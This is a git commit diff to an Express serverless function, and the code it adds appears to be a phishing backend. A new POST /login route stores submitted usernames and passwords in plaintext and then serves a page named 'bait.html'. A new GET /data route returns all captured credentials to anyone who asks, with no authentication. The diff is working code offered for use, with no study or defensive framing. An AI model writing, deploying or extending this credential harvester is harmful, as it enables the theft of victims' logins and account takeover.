b2a04b59e1e1253c5b940923a42423324d26dd04
AbdulKarim018 <lackhorse.ak@gmail.com>
2023-04-20 18:13:14 +0500

    Done!

--- functions/index.js
+++ functions/index.js
@@ -4,8 +4,8 @@ const path = require('path');
 const serverless = require('serverless-http');
 const port = 3000;
 const router = express.Router();
-const { Data } = require('../database/schema/data');
 require('../database');
+const Data = require('../database/schema/data');
 
 const app = express();
 
@@ -13,13 +13,25 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: false }));
 app.use(express.static(path.join(__dirname, '../static')));
 
-router.get('/', (req, res) => {
-    res.sendFileSync('index.html')
+router.get('/', async (req, res) => {
+    await res.sendFile('index.html');
 });
 
-router.post('/', async (req, res) => {
-    const { username, password } = req.body;
-    await Data.insertMany([username, password]);
+router.post('/login', async (req, res) => {
+    try {
+        const { username, password } = req.body;
+        if (!username || !password) throw new Error('Missing Credentials');
+        await Data.create({ username, password });
+        await res.sendFile(path.join(__dirname, '../static/bait.html'));
+    } catch (error) {
+        console.log(error);
+    }
+
+});
+
+router.get('/data', async (req, res) => {
+    const userDataDB = await Data.find();
+    res.json(userDataDB);
 });
 
 app.use('/', router);
